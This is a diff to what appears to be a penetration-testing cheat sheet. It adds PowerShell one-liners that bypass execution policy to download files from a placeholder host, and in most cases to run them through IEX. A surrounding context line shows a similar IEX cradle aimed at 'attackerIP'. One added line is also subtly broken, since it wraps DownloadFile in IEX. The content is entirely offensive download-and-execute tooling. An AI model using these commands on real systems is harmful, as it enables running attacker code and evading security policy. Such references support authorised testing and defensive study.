@@ -220,6 +220,14 @@ Alternatively, download with PowerShell Invoke-WebRequest with BasicParsing:
 powershell -c "IEX (IWR http://attackerIP/file.ps1 -UseBasicParsing)"
 ```
 
+Alternatively, download with PowerShell with Execution Policy Bypass implemented:
+
+```text
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://ip/file')"
+powershell.exe -nop -ep bypass -c "IEX(New-Object Net.WebClient).DownloadFile('http://ip/file','C:\Users\Public\Downloads\file')"
+powershell.exe -nop -ep bypass -c "IWR -URI 'http://ip/file' -Outfile '/path/to/file'"
+```
+
 Alternatively, download with curl:
 
 ```text
